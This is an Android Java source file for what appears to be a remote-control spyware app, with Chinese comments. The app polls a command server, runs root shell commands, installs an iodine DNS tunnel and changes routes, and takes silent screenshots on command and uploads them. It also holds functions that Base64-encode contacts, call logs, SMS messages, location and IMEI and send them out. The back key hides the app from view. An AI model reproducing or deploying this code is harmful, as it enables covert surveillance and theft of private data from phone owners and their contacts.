package com.example.prp;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.BasicHttpContext;
import org.apache.http.protocol.HTTP;
import org.apache.http.protocol.HttpContext;
import org.apache.http.util.EntityUtils;

import android.app.Activity;  
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;  
import android.os.Handler;  
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;  
import android.view.View.OnClickListener;  
import android.widget.Button;  
import android.widget.TextView;  
  
public class MainActivity extends Activity {  
    private Button btnUploadFile; 
    private Button btnStartIodine;
    private Button btnChangeRoute;
    private Button btnStartDect;
    private Button btnStop;   
    private Button btnDeleteFile; 
    private TextView tvResult;  
    private String result = "";  
    private boolean run = false; 
    
    private static int delayTime = 5000;
    
    private static String ipAddr = "10.0.0.1";
  
    private Handler handler = new Handler();  
  
    private Runnable task = new Runnable() {  
  
        public void run() {   
            if (run) {  
                handler.postDelayed(this, delayTime);            
               
                String command = getCommand();                
                try{
	    			if(!command.equals("noCommand")){
	    				String[] temp = command.split(":");
	    				String command_id = temp[0];
	    				String command_type = temp[1];
	    				String target = temp[2];
	    				
	    				String[] deviceInfo = getDeviceInfo();
	    				String IMEI = deviceInfo[0];
	    				
	    				if(IMEI.equals(target)){	    				
		    				String data = "";		    				
		    				switch(Integer.parseInt(command_type)){
		    					case 1:data = replyPicture(command_id);break;
		    					default:data = "invalidCommand";break;
		    				}
		    				
		    				if(data != "invalidCommand"){
		    					result = data;
		    				}
		    				else{
		    					result = "invalidCommand";
		    				}
	    				}
	    				else{
	    					result = "noCommand";
	    				}
	    				
	    			}
	    			else{
	    				result = "noCommand";    				
	    			}
                }
                catch(Exception ee) {  
        			result = ee.getMessage();
        		}
                
            }  
            tvResult.setText(result);            
        }  
    };  
  
    /** Called when the activity is first created. */  
    @Override  
    public void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
        setContentView(R.layout.activity_main);  
  
        btnUploadFile = (Button) findViewById(R.id.Button01);  
        btnStartIodine = (Button) findViewById(R.id.Button02);  
        btnChangeRoute = (Button) findViewById(R.id.Button03);  
        btnStartDect = (Button) findViewById(R.id.Button04); 
        btnStop = (Button) findViewById(R.id.Button05);  
        btnDeleteFile = (Button) findViewById(R.id.Button06);
        tvResult = (TextView) findViewById(R.id.result);  
  
        btnUploadFile.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		createFile();
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
        			execCommand("chmod 777 ." + fileDirPath + "/" + "iodine");
        			execCommand("chmod 777 ." + fileDirPath + "/" + "start_iodine.sh");
                	execCommand("chmod 777 ." + fileDirPath + "/" + "change_route.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(2);  
        	}
        });
        
        btnStartIodine.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
                	execCommand("sh ." + fileDirPath + "/" + "start_iodine.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(3);  
        	}
        });
        
        btnChangeRoute.setOnClickListener(new OnClickListener() {
        	public void onClick(View v) {
        		try {
        			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
                	execCommand("sh ." + fileDirPath + "/" + "change_route.sh");    
        	    } 
                catch (Exception e) {
                    tvResult.setText(e.getMessage());
        	    }
        		updateButton(4);  
        	}
        });
        
        btnStartDect.setOnClickListener(new OnClickListener() {    
            public void onClick(View v) {  
                run = true;  
                updateButton(5);  
                //TODO
                handler.postDelayed(task, delayTime);  
                //replyDeviceInfo();
                //replyDeviceContacts();
                //replyDeviceLocations();
                //replyDeviceCallingRecords();
                //replyDeviceSMSRecords();
            }  
        }); 
        
        btnStop.setOnClickListener(new OnClickListener() {  
            public void onClick(View v) {    
                run = false;  
                updateButton(1);  
                handler.post(task); 
                execCommand("killall iodine");
                tvResult.setText("Stopped");
            }  
        });
        
        btnDeleteFile.setOnClickListener(new OnClickListener() {  
            public void onClick(View v) {  
            	execCommand("killall iodine");
                deleteFile();
            }  
        });
        
        //TODO
        //replyDeviceInfo();
        //replyDeviceContacts();
        //replyDeviceLocations();
        //replyDeviceCallingRecords();
        //getDeviceLocation();
        //replyPicture();
        
        run = true;  
        updateButton(5);  
        handler.postDelayed(task, delayTime);
         
    }  
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
    	if (keyCode == KeyEvent.KEYCODE_BACK) {
    			moveTaskToBack(false);
    			return true;
    	}
    	return super.onKeyDown(keyCode, event);
    }
  
    private void updateButton(int status) {  
        if(status == 1){
        	btnUploadFile.setEnabled(true);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }  
        else if(status == 2){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(true);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 3){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(true);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 4){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(true); 
            btnStop.setEnabled(false);         	
        }
        else if(status == 5){
        	btnUploadFile.setEnabled(false);  
            btnStartIodine.setEnabled(false);  
            btnChangeRoute.setEnabled(false);  
            btnStartDect.setEnabled(false); 
            btnStop.setEnabled(true);         	
        }
    }  
    
    
    /**获取命令**/
	private String getCommand(){   
		try{  
			URL url = new URL("http://" + ipAddr + "/prp/index.php/command/get_command");  
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();  
			conn.setDoInput(true);  
			conn.setConnectTimeout(10000);  
			conn.setRequestMethod("GET");  
			conn.setRequestProperty("accept", "*/*");  
			String location = conn.getRequestProperty("location");  
			int resCode = conn.getResponseCode();  
			conn.connect();  
			InputStream stream = conn.getInputStream();  
			byte[] data=new byte[102400];  
			int length=stream.read(data);  
			String str=new String(data,0,length);   
			conn.disconnect();  			
			stream.close();  
			return str;
		}  
		catch(Exception ee) {  
			return ee.getMessage();
		}  
	} 
	
	/**得到手机通讯录联系人信息**/
    private String getPhoneContacts() {
    	String temp_result = "";
    	
    	//得到ContentResolver对象
        ContentResolver cr = getContentResolver();
        //取得电话本中开始一项的光标
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        //向下移动光标
        while(cursor.moveToNext())
        {
            //取得联系人名字
            int nameFieldColumnIndex = cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME);
            String contact = cursor.getString(nameFieldColumnIndex);
            //取得电话号码
            String ContactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            Cursor phone = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, 
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + ContactId, null, null);
             
            while(phone.moveToNext())
            {
                String PhoneNumber = phone.getString(phone.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                temp_result += (contact + ":" + PhoneNumber + "\n");
            }
        }
        cursor.close();
        
        return temp_result.trim();
    }
    
    /**回复命令**/
	private String replyCommand(String command_id,String result){  
		String password = "123456";
		String temp_url = "http://" + ipAddr + "/prp/index.php/command/reply_command";
		try{  
			HttpPost httpRequest = new HttpPost(temp_url); 
			
			List <NameValuePair> params = new ArrayList <NameValuePair>();
	        params.add(new BasicNameValuePair("password", password));
	        params.add(new BasicNameValuePair("result", command_id + ":" + Base64.encodeToString(result.getBytes(),Base64.DEFAULT)));
	        

	        /* 添加请求参数到请求对象*/
	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
	        /*发送请求并等待响应*/
	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
	        /*若状态码为200 ok*/
	        if(httpResponse.getStatusLine().getStatusCode() == 200){
	        	/*读返回数据*/
	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
	        	return strResult;
	        }
	        else{
	        	return "postError";
	        }
			
		}  
		catch(Exception ee) {  
			return "error:" + ee.getMessage();
		}  
	}
	
	/*上传需要的文件*/
	private void createFile() {
		String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
		
		//上传iodine
		String filePath = fileDirPath + "/" + "iodine";// 文件路径
		try{
			File dir = new File(fileDirPath);// 目录路径
			if(!dir.exists()){// 如果不存在，则创建路径名
				tvResult.setText("要存储的目录不存在");
				if(dir.mkdirs()){// 创建该路径名，返回true则表示创建成功
					tvResult.setText("已经创建文件存储目录");
				} 
				else{
					tvResult.setText("创建目录失败");
				}
			}
			// 目录存在，则将apk中raw中的需要的文档复制到该目录下
			File file = new File(filePath);
			if (!file.exists()){// 文件不存在
				tvResult.setText("要打开的文件不存在");
				InputStream ins = getResources().openRawResource(R.raw.iodine);//通过raw得到数据资源
				tvResult.setText("开始读入");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("开始写出");
				byte[] buffer = new byte[8192];
				int count = 0;// 循环写出
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("已经创建该文件");
				fos.close();// 关闭流
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
		
		//上传start_iodine.sh
		filePath = fileDirPath + "/" + "start_iodine.sh";// 文件路径
		try{
			File dir = new File(fileDirPath);// 目录路径
			if(!dir.exists()){// 如果不存在，则创建路径名
				tvResult.setText("要存储的目录不存在");
				if(dir.mkdirs()){// 创建该路径名，返回true则表示创建成功
					tvResult.setText("已经创建文件存储目录");
				} 
				else{
					tvResult.setText("创建目录失败");
				}
			}
			// 目录存在，则将apk中raw中的需要的文档复制到该目录下
			File file = new File(filePath);
			if (!file.exists()){// 文件不存在
				tvResult.setText("要打开的文件不存在");
				InputStream ins = getResources().openRawResource(R.raw.start_iodine);//通过raw得到数据资源
				tvResult.setText("开始读入");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("开始写出");
				byte[] buffer = new byte[8192];
				int count = 0;// 循环写出
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("已经创建该文件");
				fos.close();// 关闭流
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
		
		//上传change_route.sh
		filePath = fileDirPath + "/" + "change_route.sh";// 文件路径
		try{
			File dir = new File(fileDirPath);// 目录路径
			if(!dir.exists()){// 如果不存在，则创建路径名
				tvResult.setText("要存储的目录不存在");
				if(dir.mkdirs()){// 创建该路径名，返回true则表示创建成功
					tvResult.setText("已经创建文件存储目录");
				} 
				else{
					tvResult.setText("创建目录失败");
				}
			}
			// 目录存在，则将apk中raw中的需要的文档复制到该目录下
			File file = new File(filePath);
			if (!file.exists()){// 文件不存在
				tvResult.setText("要打开的文件不存在");
				InputStream ins = getResources().openRawResource(R.raw.change_route);//通过raw得到数据资源
				tvResult.setText("开始读入");
				FileOutputStream fos = new FileOutputStream(file);
				tvResult.setText("开始写出");
				byte[] buffer = new byte[8192];
				int count = 0;// 循环写出
				while ((count = ins.read(buffer)) > 0) {
					fos.write(buffer, 0, count);
				}
				tvResult.setText("已经创建该文件");
				fos.close();// 关闭流
				ins.close();
			}
		} 
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
	}
	
	/*删除上传的文件*/
	private void deleteFile(){
		try{
			String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
					
			String filePath = fileDirPath + "/" + "iodine";// 文件路径
			File file = new File(filePath);
			file.delete();	
			
			filePath = fileDirPath + "/" + "start_iodine.sh";// 文件路径
			file = new File(filePath);
			file.delete();
			
			filePath = fileDirPath + "/" + "change_route.sh";// 文件路径
			file = new File(filePath);
			file.delete();
			tvResult.setText("delete files sucess");
		}
		catch(Exception e){
			tvResult.setText(e.getMessage());
		}
	}
	
	/*执行脚本*/
	public void execCommand(String command){
	    try{
	        //权限设置
	        Process p = Runtime.getRuntime().exec("su");
	        //获取输出流
	        OutputStream outputStream = p.getOutputStream();
	        DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
	        //将命令写入
	        dataOutputStream.writeBytes(command);
	        //提交命令
	        dataOutputStream.flush();
	        //关闭流操作
	        dataOutputStream.close();
	        outputStream.close();
	        tvResult.setText("shell " + command + " sucess");
	    }
	    catch(Exception e){
	        tvResult.setText(e.getMessage());
	    }
    }
	
	/**获取设备基本信息**/
	private String[] getDeviceInfo(){ 
		TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
		String[] deviceInfo = {tm.getDeviceId(),tm.getLine1Number(),Build.MODEL,Build.VERSION.RELEASE};
		return deviceInfo;
	}
	
	/**获取设备位置信息**/
	private double[] getDeviceLocation(){		
		double latitude=0.0;
		double longitude =0.0;

		LocationManager locationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
		if(locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
			Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
			if(location != null){
				latitude = location.getLatitude();
				longitude = location.getLongitude();
				tvResult.setText("latitude:"+latitude+"\nlongitude"+longitude);
				}
		}
		else{
			LocationListener locationListener = new LocationListener() {
				
				// Provider的状态在可用、暂时不可用和无服务三个状态直接切换时触发此函数
				@Override
				public void onStatusChanged(String provider, int status, Bundle extras) {
					
				}
				
				// Provider被enable时触发此函数，比如GPS被打开
				@Override
				public void onProviderEnabled(String provider) {
					
				}
				
				// Provider被disable时触发此函数，比如GPS被关闭 
				@Override
				public void onProviderDisabled(String provider) {
					
				}
				
				//当坐标改变时触发此函数，如果Provider传进相同的坐标，它就不会被触发 
				@Override
				public void onLocationChanged(Location location) {
					if (location != null) {   
						Log.e("Map", "Location changed : Lat: "  
						+ location.getLatitude() + " Lng: "  
						+ location.getLongitude());  
						tvResult.setText("latitude:"+location.getLatitude()+"\nlongitude"+location.getLongitude());
					}
				}
			};
			locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER,1000, 0,locationListener);   
			Location location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);   
			if(location != null){   
				latitude = location.getLatitude(); //经度   
				longitude = location.getLongitude(); //纬度
				tvResult.setText("latitude:"+latitude+"\nlongitude"+longitude);
			}   
		}
		double[] location = {latitude,longitude};		
		return location;
	}
	/**得到手机通话记录**/
    private String getPhoneCallingRecords() {
    	String temp_result = "";
    	
    	ContentResolver cr = getContentResolver();		
		//查询通话记录
		Cursor cursor = cr.query(
				CallLog.Calls.CONTENT_URI,	//使用系统URI，取得通话记录
				new String[] { CallLog.Calls.NUMBER, //电话号
						CallLog.Calls.CACHED_NAME,	//联系人
						CallLog.Calls.TYPE, //通话类型
						CallLog.Calls.DATE,	//通话时间
						CallLog.Calls.DURATION //通话时长
						}, null, null,
				CallLog.Calls.DEFAULT_SORT_ORDER);
		
		//遍历每条通话记录
		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
			String strNumber = cursor.getString(0); // 呼叫号码
			String strName = cursor.getString(1); // 联系人姓名
			int type = cursor.getInt(2); 
			String str_type = "";
			if(type == CallLog.Calls.INCOMING_TYPE){
				str_type = "呼入";
			}else if(type == CallLog.Calls.OUTGOING_TYPE){
				str_type = "呼出";
			}else if(type == CallLog.Calls.MISSED_TYPE){
				str_type = "未接";
			}
			long duration = cursor.getLong(4);
			SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			Date date = new Date(Long.parseLong(cursor.getString(3)));
			String time = sfd.format(date);

			temp_result += (strNumber + "%" + time + "%" + str_type + "%" + duration + "\n");
		}
        
        return temp_result.trim();
    }
	/**得到手机通话记录**/
    private String getPhoneSMSRecords() {
    	String temp_result = "";
    	
    	final String SMS_URI_ALL   = "content://sms/";     
	    final String SMS_URI_INBOX = "content://sms/inbox";   
	    final String SMS_URI_SEND  = "content://sms/sent";   
	    final String SMS_URI_DRAFT = "content://sms/draft";   
	    
    	ContentResolver cr = getContentResolver();   
        String[] projection = new String[]{"_id", "address", "person",    
                "body", "date", "type"};   
        Uri uri = Uri.parse(SMS_URI_ALL);   
        Cursor cur = cr.query(uri, projection, null, null, "date desc");   
  
        if (cur.moveToFirst()) {   
            String name;    
            String phoneNumber;          
            String smsbody;   
            String date;   
            String type;   
            
            int nameColumn = cur.getColumnIndex("person");   
            int phoneNumberColumn = cur.getColumnIndex("address");   
            int smsbodyColumn = cur.getColumnIndex("body");   
            int dateColumn = cur.getColumnIndex("date");   
            int typeColumn = cur.getColumnIndex("type");   
            
            do{   
                name = cur.getString(nameColumn);                
                phoneNumber = cur.getString(phoneNumberColumn);   
                smsbody = cur.getString(smsbodyColumn);   
                   
                SimpleDateFormat dateFormat = new SimpleDateFormat(   
                        "yyyy-MM-dd hh:mm:ss");   
                Date d = new Date(Long.parseLong(cur.getString(dateColumn)));   
                date = dateFormat.format(d);   
                   
                int typeId = cur.getInt(typeColumn);   
                if(typeId == 1){   
                    type = "接收";   
                } 
                else if(typeId == 2){   
                    type = "发送";   
                } 
                else {   
                    type = "";   
                }   
                                
                temp_result += (phoneNumber + "%" + date + "%" + type + "%" + smsbody + "\n");
                
                if(smsbody == null) smsbody = "";     
            }while(cur.moveToNext());   
        } 
        else {   
            ;
        }   
                    
        return temp_result.trim();
    }    
    /**返回设备基本信息**/
	private String replyDeviceInfo(){ 
		String[] deviceInfo = getDeviceInfo();
		
		deviceInfo[0] = (deviceInfo[0].length() == 0) ? "no IMEI" : deviceInfo[0];
		deviceInfo[1] = (deviceInfo[1].length() == 0) ? "no phoneNumber" : deviceInfo[1];
		deviceInfo[2] = (deviceInfo[2].length() == 0) ? "no phoneType" : deviceInfo[2];
		deviceInfo[3] = (deviceInfo[3].length() == 0) ? "no systemType" : deviceInfo[3];
		
		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_info";
		try{  
			HttpPost httpRequest = new HttpPost(temp_url); 
			
			List <NameValuePair> params = new ArrayList <NameValuePair>();
	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("phoneNumber", Base64.encodeToString(deviceInfo[1].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("phoneType", Base64.encodeToString(deviceInfo[2].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("system", Base64.encodeToString(deviceInfo[3].getBytes(),Base64.DEFAULT)));

	        /* 添加请求参数到请求对象*/
	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
	        /*发送请求并等待响应*/
	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
	        /*若状态码为200 ok*/
	        if(httpResponse.getStatusLine().getStatusCode() == 200){
	        	/*读返回数据*/
	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
	        	return strResult;
	        }
	        else{
	        	return "postError";
	        }
			
		}  
		catch(Exception ee) {  
			return "error:" + ee.getMessage();
		}  
	}
	/**返回设备通讯录信息**/
	private String replyDeviceContacts(){ 
		String[] deviceInfo = getDeviceInfo();
		String contacts = getPhoneContacts();
		if(contacts.length() != 0){
			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_contacts";
			try{  
				HttpPost httpRequest = new HttpPost(temp_url); 
				
				List <NameValuePair> params = new ArrayList <NameValuePair>();
		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
		        params.add(new BasicNameValuePair("contacts", Base64.encodeToString(contacts.getBytes(),Base64.DEFAULT)));
	
		        /* 添加请求参数到请求对象*/
		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
		        /*发送请求并等待响应*/
		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
		        /*若状态码为200 ok*/
		        if(httpResponse.getStatusLine().getStatusCode() == 200){
		        	/*读返回数据*/
		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
		        	return strResult;
		        }
		        else{
		        	return "postError";
		        }
				
			}  
			catch(Exception ee) {  
				return "error:" + ee.getMessage();
			}  
		}
		else{
			return "no contacts";
		}
	}
	/**返回设备位置信息**/
	private String replyDeviceLocations(){ 
		String[] deviceInfo = getDeviceInfo();
		double[] deviceLocation = getDeviceLocation();
		String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_locations";
		try{  
			HttpPost httpRequest = new HttpPost(temp_url); 
			
			List <NameValuePair> params = new ArrayList <NameValuePair>();
	        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("latitude", Base64.encodeToString(Double.toString(deviceLocation[0]).getBytes(),Base64.DEFAULT)));
	        params.add(new BasicNameValuePair("longitude", Base64.encodeToString(Double.toString(deviceLocation[0]).getBytes(),Base64.DEFAULT)));

	        /* 添加请求参数到请求对象*/
	        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
	        /*发送请求并等待响应*/
	        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
	        /*若状态码为200 ok*/
	        if(httpResponse.getStatusLine().getStatusCode() == 200){
	        	/*读返回数据*/
	        	String strResult = EntityUtils.toString(httpResponse.getEntity());
	        	return strResult;
	        }
	        else{
	        	return "postError";
	        }
			
		}  
		catch(Exception ee) {  
			return "error:" + ee.getMessage();
		}  
	}
	/**返回设备通话记录**/
	private String replyDeviceCallingRecords(){ 
		String[] deviceInfo = getDeviceInfo();
		String callingRecords = getPhoneCallingRecords();
		if(callingRecords.length() != 0){
			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_calling_records";
			try{  
				HttpPost httpRequest = new HttpPost(temp_url); 
				
				List <NameValuePair> params = new ArrayList <NameValuePair>();
		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
		        params.add(new BasicNameValuePair("calling_records", Base64.encodeToString(callingRecords.getBytes(),Base64.DEFAULT)));
	
		        /* 添加请求参数到请求对象*/
		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
		        /*发送请求并等待响应*/
		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
		        /*若状态码为200 ok*/
		        if(httpResponse.getStatusLine().getStatusCode() == 200){
		        	/*读返回数据*/
		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
		        	return strResult;
		        }
		        else{
		        	return "postError";
		        }
				
			}  
			catch(Exception ee) {  
				return "error:" + ee.getMessage();
			}  
		}
		else{
			return "no callingRecords";
		}
	}
	/**返回设备短信记录**/
	private String replyDeviceSMSRecords(){ 
		String[] deviceInfo = getDeviceInfo();
		String smsRecords = getPhoneSMSRecords();
		if(smsRecords.length() != 0){
			String temp_url = "http://" + ipAddr + "/prp/index.php/device/reply_device_sms_records";
			try{  
				HttpPost httpRequest = new HttpPost(temp_url); 
				
				List <NameValuePair> params = new ArrayList <NameValuePair>();
		        params.add(new BasicNameValuePair("IMEI", Base64.encodeToString(deviceInfo[0].getBytes(),Base64.DEFAULT)));
		        params.add(new BasicNameValuePair("sms_records", Base64.encodeToString(smsRecords.getBytes(),Base64.DEFAULT)));
	
		        /* 添加请求参数到请求对象*/
		        httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
		        /*发送请求并等待响应*/
		        HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
		        /*若状态码为200 ok*/
		        if(httpResponse.getStatusLine().getStatusCode() == 200){
		        	/*读返回数据*/
		        	String strResult = EntityUtils.toString(httpResponse.getEntity());
		        	return strResult;
		        }
		        else{
		        	return "postError";
		        }
				
			}  
			catch(Exception ee) {  
				return "error:" + ee.getMessage();
			}  
		}
		else{
			return "no smsRecords";
		}
	}
	/**返回图片**/
	public String replyPicture(String command_id){	
		String fileDirPath = getApplicationContext().getFilesDir().getAbsolutePath();
		String result = takePicture("",fileDirPath);
        //String result = "sucess";
        if(result.equals("sucess")){        	
            try{        	      	
            	List <NameValuePair> params = new ArrayList <NameValuePair>();
            	String fileName = "img.png";
    	        params.add(new BasicNameValuePair("userfile", fileDirPath + "/" + fileName));
    	        params.add(new BasicNameValuePair("command_id", Base64.encodeToString(command_id.getBytes(),Base64.DEFAULT)));
    	        
    	        return postPicture("http://" + ipAddr + "/prp/index.php/device/reply_picture",params,fileName,"image/png");
            }
            catch(Exception e){
            	return e.getMessage();
            }	
        } 
        else{
        	return result;        	
        } 
	}
	public String postPicture(final String url, final List<NameValuePair> nameValuePairs, String fileName, String fileType) {
	    final HttpClient httpClient = new DefaultHttpClient();
	    final HttpContext localContext = new BasicHttpContext();
	    final HttpPost httpPost = new HttpPost(url);

	    try {
	        final MultipartEntity entity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);

	        for(int index=0; index < nameValuePairs.size(); index++) {
	            if(nameValuePairs.get(index).getName().equalsIgnoreCase("userfile")) {
	                // If the key equals to "userfile", we use FileBody to transfer the data
	                entity.addPart(nameValuePairs.get(index).getName(), new FileBody(new File (nameValuePairs.get(index).getValue()), fileName, fileType, "utf-8"));
	            } else {
	                // Normal string data
	                entity.addPart(nameValuePairs.get(index).getName(), new StringBody(nameValuePairs.get(index).getValue()));
	            }
	        }

	        httpPost.setEntity(entity);

	        final HttpResponse response = httpClient.execute(httpPost, localContext);

	        final String responseBody = EntityUtils.toString(response.getEntity());
	        System.out.println("RESPONSE BODY: " + responseBody);
	        return responseBody;
	    } 
	    catch (final IOException e) {
	        e.printStackTrace();
	        return e.getMessage();
	    }
	}
	/**后台截屏**/
	public String takePicture(String file,String fileDirPath){
		try{
			
			execCommand("/system/bin/screencap -p " + fileDirPath + "/img.png");
	        return "sucess";
		}
		catch(Exception e){
			return e.getMessage();
		}		
	}
}  
